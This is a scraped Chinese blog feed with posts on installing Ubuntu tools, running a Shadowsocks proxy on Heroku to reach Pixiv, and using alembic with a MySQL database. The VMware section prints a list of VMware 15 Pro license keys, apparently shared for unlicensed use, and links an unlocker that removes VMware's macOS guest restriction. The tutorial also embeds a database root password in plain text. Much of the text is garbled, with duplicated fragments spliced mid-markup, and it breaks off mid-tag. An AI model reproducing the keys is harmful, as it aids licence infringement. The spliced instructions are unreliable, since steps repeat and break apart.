language-bash"><code class="language-bash"><span class="token function">sudo</span> add-apt-repository ppa:ubuntuhandbook1/apps<span class="token function">sudo</span> add-apt-repository ppa:dhor/myway<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2.更新</p><pre class="line-numbers language-bash">sudo apt-get update</code></pre><p>3.安装</p><pre><code class="bash">sudo apt-get install hotshots``</code></pre><p>4.移除</p><pre><code class="bash">sudo apt-get remove hotshots</code></pre></blockquote><h4 id="3-shutter"><a href="#3-shutter" class="headerlink" title="3.shutter"></a>3.<code>shutter</code></h4><blockquote><p>如果需要其他的截图工具,可以使用<code>shutter</code>,他有一些小的特效.,可以导出为<code>pdf</code>等文件.功能更多.也可以设置快捷键.</p></blockquote><blockquote><pre><code class="bash"><code class="language-bash">sudo apt-get update</code></pre><p>3.安装</p><pre><code class="bash">sudo apt-get install hotshots``</code></pre><p>4.移除</p><pre><code class="bash">sudo apt-get remove hotshots</code></pre></blockquote><h4 id="3-shutter"><a href="#3-shutter" class="headerlink" title="3.shutter"></a>3.<code>shutter</code></h4><blockquote><p>如果需要其他的截图工具,可以使用<code>shutter</code>,他有一些小的特效.,可以导出为<code>pdf</code>等文件.功能更多.也可以设置快捷键.</p></blockquote><blockquote><pre><code class="bash">sudo add-apt-repository ppa:shutter/ppasudo apt-get updatesudo apt-get install shutter<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="15-图片编辑gimp"><a href="#15-图片编辑gimp" class="headerlink" title="15.图片编辑gimp"></a>15.图片编辑<code>gimp</code></h3><blockquote><p>提示<code>/var/cache/apt/archives/</code> 空间不足,</p><p>这个目录是存放<code>apt install</code> 的文件的,可以使用<code>apt-get clean</code> 来清除缓存</p></blockquote><blockquote><pre class="line-numbers language-bash">sudo apt install gimp</code></pre></blockquote><h3 id="16-Anaconda-miniconda"><a href="#16-Anaconda-miniconda" class="headerlink" title="16.Anaconda\miniconda"></a>16.<code>Anaconda\miniconda</code></h3><h4 id="1-下载安装"><a href="#1-下载安装" class="headerlink" title="1.下载安装"></a>1.下载安装</h4><blockquote><p>官方下载<code>https://www.anaconda.com/</code> ,也可以通过清华大学镜像源安装<code>https://mirror.tuna.tsinghua.edu.cn/help/anaconda/</code></p><pre><code class="bash"><code class="language-bash">sudo apt install gimp</code></pre></blockquote><h3 id="16-Anaconda-miniconda"><a href="#16-Anaconda-miniconda" class="headerlink" title="16.Anaconda\miniconda"></a>16.<code>Anaconda\miniconda</code></h3><h4 id="1-下载安装"><a href="#1-下载安装" class="headerlink" title="1.下载安装"></a>1.下载安装</h4><blockquote><p>官方下载<code>https://www.anaconda.com/</code> ,也可以通过清华大学镜像源安装<code>https://mirror.tuna.tsinghua.edu.cn/help/anaconda/</code></p><pre><code class="bash">#$chmod +x Anaconda3-2019.07-Linux-x86_64.sh # 安装$./Anaconda3-2019.07-Linux-x86_64.sh <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="2-配置环境变量"><a href="#2-配置环境变量" class="headerlink" title="2.配置环境变量"></a>2.配置环境变量</h4><blockquote><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 打开个人环境变量</span>$ <span class="token function">sudo</span> vim ~/.bashrc<span class="token comment" spellcheck="true"># 在文件的末尾添加数据</span><span class="token function">export</span> PATH<span class="token operator">=</span>~/anaconda3/bin:<span class="token variable">$PATH</span><span class="token comment" spellcheck="true"># 重启环境变量</span>$ <span class="token function">source</span> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后可以看到加载了anaconda的终端效果</p><p>关于命令行前的<code>base</code></p><p>查看自己的环境变量中关于<code>conda</code> 的字段</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># >>> conda initialize >>></span><span class="token comment" spellcheck="true"># !! Contents within this block are managed by 'conda init' !!</span>__conda_setup<span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span>'/home/kning/anaconda3/bin/conda' 'shell.bash' 'hook' 2<span class="token operator">></span> /dev/null<span class="token variable">)</span></span>"</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$?</span> -eq 0 <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span><span class="token function">eval</span> <span class="token string">"<span class="token variable">$__conda_setup</span>"</span><span class="token keyword">else</span><span class="token keyword">if</span> <span class="token punctuation">[</span> -f <span class="token string">"/home/kning/anaconda3/etc/profile.d/conda.sh"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">.</span> <span class="token string">"/home/kning/anaconda3/etc/profile.d/conda.sh"</span><span class="token keyword">else</span>  <span class="token function">export</span> PATH<span class="token operator">=</span><span class="token string">"/home/kning/anaconda3/bin:<span class="token variable">$PATH</span>"</span><span class="token keyword">fi</span><span class="token keyword">fi</span>unset __conda_setup<span class="token comment" spellcheck="true"># &lt;&lt;&lt; conda initialize &lt;&lt;&lt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个是anoconda 自动安装添加的,即打开终端的时候会自动执行<code>conda activate base</code> 命令,可以执行</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 退出anaconda 环境</span>conda deactivate  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>来退出 base 环境,这应该是一个保护系统python 的一个措施.</p></blockquote><h4 id="3-修改镜像源"><a href="#3-修改镜像源" class="headerlink" title="3.修改镜像源"></a>3.修改镜像源</h4><blockquote><p>修改为清华大学数据源<code>https://mirror.tuna.tsinghua.edu.cn/help/anaconda/</code></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#创建或者 修改用户目录下的 .condarc 文件:</span>$ vim ~/.condarc<span class="token comment" spellcheck="true"># 添加</span>channels:  - defaultsshow_channel_urls: <span class="token boolean">true</span>default_channels:  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/rcustom_channels:  conda-forge: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud  msys2: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud  bioconda: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud  menpo: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud  pytorch: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>即可添加 <code>Anaconda Python</code> 免费仓库.可以运行<code>conda install xxx</code> 来测试验证.</p></blockquote><h3 id="17-安装vmware"><a href="#17-安装vmware" class="headerlink" title="17.安装vmware"></a>17.安装<code>vmware</code></h3><h4 id="1-下载"><a href="#1-下载" class="headerlink" title="1.下载"></a>1.下载</h4><blockquote><p>上vmware的英文官方网站下载,可以不用注册直接下载适用于linux的版本</p><pre class="line-numbers language-bash">VMware-Workstation-Full-15.1.0-13591040.x86_64.bundle </code></pre></blockquote><h4 id="2-安装vmware-workstation"><a href="#2-安装vmware-workstation" class="headerlink" title="2.安装vmware workstation"></a>2.安装vmware workstation</h4><blockquote><p>系统内核,vmware版本</p><pre><code class="bash"><code class="language-bash">VMware-Workstation-Full-15.1.0-13591040.x86_64.bundle </code></pre></blockquote><h4 id="2-安装vmware-workstation"><a href="#2-安装vmware-workstation" class="headerlink" title="2.安装vmware workstation"></a>2.安装vmware workstation</h4><blockquote><p>系统内核,vmware版本</p><pre><code class="bash"># 内核kning@kning-pc:~/software$ uname -a Linux kning-pc 5.0.0-27-generic #28~18.04.1-Ubuntu SMP Thu Aug 22 03:00:32 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux# vmware15.1.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>安装</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 添加执行权限</span>kning@kning-pc:~/software$ <span class="token function">chmod</span> +x VMware-Workstation-Full-15.1.0-13591040.x86_64.bundle <span class="token comment" spellcheck="true"># 执行安装</span>kning@kning-pc:~/software$ <span class="token function">sudo</span> ./VMware-Workstation-Full-15.1.0-13591040.x86_64.bundle <span class="token comment" spellcheck="true"># 运行</span>kning@kning-pc:~/software$ vmware<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="3-安装报错"><a href="#3-安装报错" class="headerlink" title="3.安装报错"></a>3.安装报错</h4><blockquote><p>一般最新的vmware都会安装在最新的内核上,如果不行的话,访问从新编译内核的地址</p><p><code>https://github.com/mkubecek/vmware-host-modules</code> 这里有针对各种版本的从新编译的vmware内核,需要从新编译安装.</p></blockquote><h4 id="4-vmware-15-pro-key"><a href="#4-vmware-15-pro-key" class="headerlink" title="4.vmware 15 pro key"></a>4.vmware 15 pro key</h4><blockquote><pre class="line-numbers language-bash"><code class="language-bash">ZC10K-8EF57-084QZ-VXYXE-ZF2XFUF71K-2TW5J-M88QZ-8WMNT-WKUY4AZ7MK-44Y1J-H819Z-WMYNC-N7ATFCU702-DRD1M-H89GP-JFW5E-YL8X6YY5EA-00XDJ-480RP-35QQV-XY8F6VA510-23F57-M85PY-7FN7C-MCRG0UZ792-DHF8J-M81XP-MGM5T-MCAF2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="5-卸载bundle格式的vmware"><a href="#5-卸载bundle格式的vmware" class="headerlink" title="5.卸载bundle格式的vmware"></a>5.卸载bundle格式的vmware</h4><blockquote><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 卸载</span><span class="token function">sudo</span> vmware-installer -u vmware-workstation<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="6-安装unlocker"><a href="#6-安装unlocker" class="headerlink" title="6.安装unlocker"></a>6.安装<code>unlocker</code></h4><blockquote><p>解开vmware对macos等系统的限制</p><p>项目主页<code>https://github.com/DrDonk/unlocker</code></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 查看安装说明</span><span class="token variable">$notepadqq</span> readme.txt <span class="token operator">>></span> null<span class="token comment" spellcheck="true">#</span><span class="token variable">$chmod</span> +x lnx-install.sh <span class="token comment" spellcheck="true"># 安装</span><span class="token variable">$sudo</span> sh lnx-install.sh <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="18-gftp"><a href="#18-gftp" class="headerlink" title="18.gftp"></a>18.<code>gftp</code></h3><blockquote><p>小型的<code>FTP</code>客户端</p><pre class="line-numbers language-bash">$ sudo apt install gftp</code></pre></blockquote><h3 id="19-psensor"><a href="#19-psensor" class="headerlink" title="19.psensor"></a>19.<code>psensor</code></h3><blockquote><p>安装硬件温度实时监控</p><pre><code class="bash"><code class="language-bash">$ sudo apt install gftp</code></pre></blockquote><h3 id="19-psensor"><a href="#19-psensor" class="headerlink" title="19.psensor"></a>19.<code>psensor</code></h3><blockquote><p>安装硬件温度实时监控</p><pre><code class="bash">$ sudo apt install lm-sensors hddtemp$ sudo sensors-detect$ sensors  $ 查看硬件实时温度$ sudo apt install psensor # 安装图形界面<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Ubuntu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>登录浏览P站</title>
      <link href="/posts/47601.html"/>
      <url>/posts/47601.html</url>
      
        <content type="html"><![CDATA[<h2 id="部署访问Pivix"><a href="#部署访问Pivix" class="headerlink" title="部署访问Pivix"></a>部署访问<code>Pivix</code></h2><img src="https://tva1.sinaimg.cn/large/a20ab060gy1giif723wstj21o01o0kjo.jpg" alt="4M" style="zoom:50%"><h3 id="使用heroku免费部署shadowsocks"><a href="#使用heroku免费部署shadowsocks" class="headerlink" title="使用heroku免费部署shadowsocks"></a>使用<code>heroku</code>免费部署<code>shadowsocks</code></h3><blockquote><p>访问<a href="https://www.heroku.com/" target="_blank" rel="noopener">heroku</a>,并注册一个账户,需要说明的是最好使用<code>google mail / outlook mail</code>,不要使用<code>qq\163</code>,因为大概率收不到激活邮件.</p><p>免费账户有如下限制:</p><ul><li>能够使用<code>512M</code>内存</li><li><code>30min</code>无人访问后应用休眠</li><li>应用每个月 <code>500h</code> 的免费活动时间</li></ul><p>对于一个轻度应用来说,这应该是足够了.</p></blockquote><h4 id="创建shadowsocks-APP"><a href="#创建shadowsocks-APP" class="headerlink" title="创建shadowsocks APP"></a>创建<code>shadowsocks APP</code></h4><blockquote><ol><li><p>点击 <a href="https://heroku.com/deploy?template=https://github.com/onplus/shadowsocks-heroku/tree/re" target="_blank" rel="noopener"><img src="https://www.herokucdn.com/deploy/button.svg"></a>, 一键部署到heroku</p></li><li><p>设置 加密算法和app 密码</p></li></ol><p><img src="https://user-images.githubusercontent.com/31188782/31310674-e783c9e4-abce-11e7-87d2-48f328e74169.JPG" alt="default"></p><p>支持的加密算法类型如下<a href="https://github.com/mrluanma/shadowsocks-heroku#supported-ciphers" target="_blank" rel="noopener">https://github.com/mrluanma/shadowsocks-heroku#supported-ciphers</a></p><p>设置完成后点击 <strong>Deploy app</strong>，等待部署完成后，点击最下方的 <strong>View</strong> 按钮，如果在新标签页看到下面的这句话就代表部署成功了</p><pre class="line-numbers language-html">Welcome to Heroku https://github.com/onplus/shadowsocks-heroku</code></pre></blockquote><h4 id="启动客户端"><a href="#启动客户端" class="headerlink" title="启动客户端"></a>启动客户端</h4><blockquote><ol><li><p>下载对应版本的客户端:<a href="https://github.com/onplus/shadowsocks-heroku/releases/tag/0.9.10.1.%E7%94%B1%E4%BA%8E%E6%88%91%E4%BD%BF%E7%94%A8%E7%9A%84%60Ubuntu%60,%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%98%AF%E6%BA%90%E7%A0%81%E7%89%88%E6%9C%AC" target="_blank" rel="noopener">https://github.com/onplus/shadowsocks-heroku/releases/tag/0.9.10.1.由于我使用的`Ubuntu`,下载的是源码版本</a>.</p></li><li><p>修改<code>config.json</code>参数,需要注意的是<code>server</code>是创建的<code>app name</code>,密码是<code>app password</code></p></li></ol><pre><code class="json"><code class="language-html">Welcome to Heroku https://github.com/onplus/shadowsocks-heroku</code></pre></blockquote><h4 id="启动客户端"><a href="#启动客户端" class="headerlink" title="启动客户端"></a>启动客户端</h4><blockquote><ol><li><p>下载对应版本的客户端:<a href="https://github.com/onplus/shadowsocks-heroku/releases/tag/0.9.10.1.%E7%94%B1%E4%BA%8E%E6%88%91%E4%BD%BF%E7%94%A8%E7%9A%84%60Ubuntu%60,%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%98%AF%E6%BA%90%E7%A0%81%E7%89%88%E6%9C%AC" target="_blank" rel="noopener">https://github.com/onplus/shadowsocks-heroku/releases/tag/0.9.10.1.由于我使用的`Ubuntu`,下载的是源码版本</a>.</p></li><li><p>修改<code>config.json</code>参数,需要注意的是<code>server</code>是创建的<code>app name</code>,密码是<code>app password</code></p></li></ol><pre><code class="json">  "server": "ning.herokuapp.com",  "local_address": "127.0.0.1",  "scheme": "ws",  "local_port": 1080,  "remote_port": 80,  "password": "200",  "timeout": 600,  "method": "aes-256-cfb"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>安装<code>nodejs</code>模块</li></ol><pre class="line-numbers language-bash">$ npm install package.json </code></pre><ol start="4"><li>启动</li></ol><pre><code class="bash"><code class="language-bash">$ npm install package.json </code></pre><ol start="4"><li>启动</li></ol><pre><code class="bash">$ node local.js# 或者$ sudo node local.jsserver listening at { address: '127.0.0.1', family: 'IPv4', port: 1080 }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="浏览器设置"><a href="#浏览器设置" class="headerlink" title="浏览器设置"></a>浏览器设置</h4><blockquote><p><code>Firefox/Chrome</code>都可以安装<code>Proxy SwitchyOmega</code>:<a href="https://github.com/ningwenyan/demo_code/tree/master/chrome%E6%8F%92%E4%BB%B6" target="_blank" rel="noopener">https://github.com/ningwenyan/demo_code/tree/master/chrome%E6%8F%92%E4%BB%B6</a></p><p>下载后,设置代理如下:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-6/1599381375318-10279.png" alt="10279"></p><p>写入的地址是<code>https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt</code>,这是一个需要代理的列表总和.</p></blockquote><h4 id="访问pixvix"><a href="#访问pixvix" class="headerlink" title="访问pixvix"></a>访问<code>pixvix</code></h4><blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-6/1599381695799-10280.png" alt="10280"></p></blockquote><h3 id="下载图片"><a href="#下载图片" class="headerlink" title="下载图片"></a>下载图片</h3><blockquote><p>使用油猴脚本</p></blockquote><h4 id="油猴安装"><a href="#油猴安装" class="headerlink" title="油猴安装"></a>油猴安装</h4><blockquote><p>油猴官网安装：<a href="https://tampermonkey.net/" target="_blank" rel="noopener">https://tampermonkey.net/</a></p><p>访问官方商店,在<code>Firefox/chrome</code>商店中安装油猴脚本.</p><p>下载所需脚本:<a href="https://greasyfork.org/zh-CN" target="_blank" rel="noopener">https://greasyfork.org/zh-CN</a></p></blockquote><h4 id="pixvix增强脚本"><a href="#pixvix增强脚本" class="headerlink" title="pixvix增强脚本"></a><code>pixvix</code>增强脚本</h4><blockquote><p>访问<a href="https://greasyfork.org/zh-CN,%E6%89%BE%E5%88%B0%60pixvix%E5%A2%9E%E5%BC%BA%E8%84%9A%E6%9C%AC%60%E5%B9%B6%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85,%E6%8C%89%E7%85%A7%E5%AE%8C%E6%AF%95%E5%90%8E,%E5%8F%AF%E4%BB%A5%E8%A7%82%E7%9C%8B%E6%95%88%E6%9E%9C" target="_blank" rel="noopener">https://greasyfork.org/zh-CN,找到`pixvix增强脚本`并下载安装,按照完毕后,可以观看效果</a></p></blockquote><h3 id="常用下载"><a href="#常用下载" class="headerlink" title="常用下载"></a>常用下载</h3><blockquote><p>自己常用的<code>pivix</code>图片下载<code>https://pixiviz.pwp.app/</code></p><ul><li><code>https://pixivic.com</code></li></ul></blockquote><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><blockquote><p><a href="https://github.com/onplus/shadowsocks-heroku" target="_blank" rel="noopener">项目地址</a></p><p><a href="https://biu.tls.moe/#/" target="_blank" rel="noopener">pixivbiu</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Heroku Shadowsocks </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Heroku </tag>
            
            <tag> Shadowsocks </tag>
            
            <tag> Pixiv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL版本管理工具alembic</title>
      <link href="/posts/48390.html"/>
      <url>/posts/48390.html</url>
      
        <content type="html"><![CDATA[<h2 id="alembic"><a href="#alembic" class="headerlink" title="alembic"></a><code>alembic</code></h2><h3 id="1-什么是alembic"><a href="#1-什么是alembic" class="headerlink" title="1. 什么是alembic"></a>1. 什么是<code>alembic</code></h3><blockquote><p>随着项目业务需求的不断变更,数据库的表结构修改难以避免,此时就需要对数据库的修改加以记录和控制,便于项目的版本管理和随意升级和降级.</p><p><code>alembic</code> 很好的解决了这个问题,<code>alembic</code> 是<code>SQLAlchemy</code>的作者开发的<code>Python</code>数据库版本管理工具.</p><p><a href="https://alembic.sqlalchemy.org/en/latest/tutorial.html#the-migration-environment" target="_blank" rel="noopener">官网</a></p></blockquote><h3 id="2-安装"><a href="#2-安装" class="headerlink" title="2.安装"></a>2.安装</h3><blockquote><pre class="line-numbers language-bash">$ conda install alembic</code></pre><p><code>alembic</code> 需要<code>sqlalchemy</code> 和数据库控制工具如<code>pymysql</code> 的支持,确保安装了这两个工具.</p><pre><code class="bash"><code class="language-bash">$ conda install alembic</code></pre><p><code>alembic</code> 需要<code>sqlalchemy</code> 和数据库控制工具如<code>pymysql</code> 的支持,确保安装了这两个工具.</p><pre><code class="bash">$ conda install sqlalchemy$ conda install pymysql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h3 id="3-基本流程"><a href="#3-基本流程" class="headerlink" title="3.基本流程"></a>3.基本流程</h3><blockquote><ol><li>初始化</li><li>修改<code>init</code>配置文件</li><li>修改<code>env.py</code></li><li>创建新的迁移脚本</li><li>变更数据库版本<ol><li>升级数据库版本</li><li>降级数据库版本</li></ol></li></ol></blockquote><h4 id="1-初始化"><a href="#1-初始化" class="headerlink" title="1.初始化"></a>1.初始化</h4><blockquote><p>先创建一个<code>sqlalchemy</code> 的<code>ORM</code>映射:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token triple-quoted-string string">"""存在数据库 alembic_demo如果不存在, create database alembic_demo"""</span><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> Column<span class="token punctuation">,</span>ForeignKey<span class="token punctuation">,</span>Integer<span class="token punctuation">,</span>String<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> create_engine<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> sessionmaker<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>ext<span class="token punctuation">.</span>declarative <span class="token keyword">import</span> declarative_base<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span>  relationship<span class="token comment" spellcheck="true"># 1.创建数据库连接</span>msg <span class="token operator">=</span> <span class="token string">'mysql+pymysql://root:2008.Cn123@192.168.0.101:3306/alembic_demo'</span>engine <span class="token operator">=</span> create_engine<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2.创建Session</span>Session <span class="token operator">=</span> sessionmaker<span class="token punctuation">(</span>bind<span class="token operator">=</span>engine<span class="token punctuation">)</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3.创建Model</span><span class="token comment" spellcheck="true"># 创建 Base</span>Base <span class="token operator">=</span> declarative_base<span class="token punctuation">(</span>bind<span class="token operator">=</span>engine<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建Model</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span> __tablename__ <span class="token operator">=</span> <span class="token string">'user'</span> id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> addresses <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Address'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Address</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span> __tablename__ <span class="token operator">=</span> <span class="token string">'address'</span> id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> email_address <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> u_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'user.id'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> user <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'addresses'</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""真实业务不能删除表,从新创建,必须做好版本控制Base.metadata.drop_all(engine)Base.metadata.create_all(engine)"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后进行初始化操作,<code>alembic init &lt;YOUR_ALEMBIC_DIR&gt;</code></p><p>这条命令默认会创建一个<code>&lt;YOUR_ALEMBIC_DIR&gt;</code> 的文件夹,所以最好能配置到项目的根目录中.</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">(</span>learnpy<span class="token punctuation">)</span> kning@kning-pc:$ alembic init alembicCreating directory /home/kning/My_Note/Python3_learn/Flask/code/alembic_demo/alembic <span class="token punctuation">..</span>.  <span class="token keyword">done</span>Creating directory /home/kning/My_Note/Python3_learn/Flask/code/alembic_demo/alembic/versions <span class="token punctuation">..</span>.  <span class="token keyword">done</span>Generating /home/kning/My_Note/Python3_learn/Flask/code/alembic_demo/alembic/env.py <span class="token punctuation">..</span>.  <span class="token keyword">done</span>Generating /home/kning/My_Note/Python3_learn/Flask/code/alembic_demo/alembic/script.py.mako <span class="token punctuation">..</span>.  <span class="token keyword">done</span>Generating /home/kning/My_Note/Python3_learn/Flask/code/alembic_demo/alembic/README <span class="token punctuation">..</span>.  <span class="token keyword">done</span>Generating /home/kning/My_Note/Python3_learn/Flask/code/alembic_demo/alembic.ini <span class="token punctuation">..</span>.  <span class="token keyword">done</span>Please edit configuration/connection/logging settings <span class="token keyword">in</span><span class="token string">'/home/kning/My_Note/Python3_learn/Flask/code/alembic_demo/alembic.ini'</span> before proceeding.<span class="token punctuation">(</span>learnpy<span class="token punctuation">)</span> kning@kning-pc:$ tree<span class="token keyword">.</span>├── alembic                                     <span class="token comment" spellcheck="true"># &lt;YOUR_ALEMBIC_DIR> 创建的文件夹名字</span>│   ├── env.py                               <span class="token comment" spellcheck="true">#  迁移脚本</span>│   ├── README                     │   ├── script.py.mako             │   └── versions                          <span class="token comment" spellcheck="true"># 数据库对应版本文件夹</span>├── alembic.ini                            <span class="token comment" spellcheck="true"># alembic配置文件</span>└── sqlalchemy_model.py            <span class="token comment" spellcheck="true"># 项目文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="2-修改init-配置文件"><a href="#2-修改init-配置文件" class="headerlink" title="2.修改init 配置文件"></a>2.修改<code>init</code> 配置文件</h4><blockquote><p>默认创建完毕后,<code>alembic</code> 并不知道数据库是如何连接的.所以需要修改它的配置文件.</p><pre class="line-numbers language-ini"><code class="language-ini">$ vim  alembic.ini...# 找到 sqlalchemy.url <span class="token attr-value"><span class="token punctuation">=</span> driver://user:pass@localhost/dbname</span># 修改为和 sqlalchemy 的engine 一样的格式<span class="token constant">sqlalchemy.url</span> <span class="token attr-value"><span class="token punctuation">=</span> mysql+pymysql://root:2008.Cn123@192.168.0.101:3306/alembic_demo</span>...<span 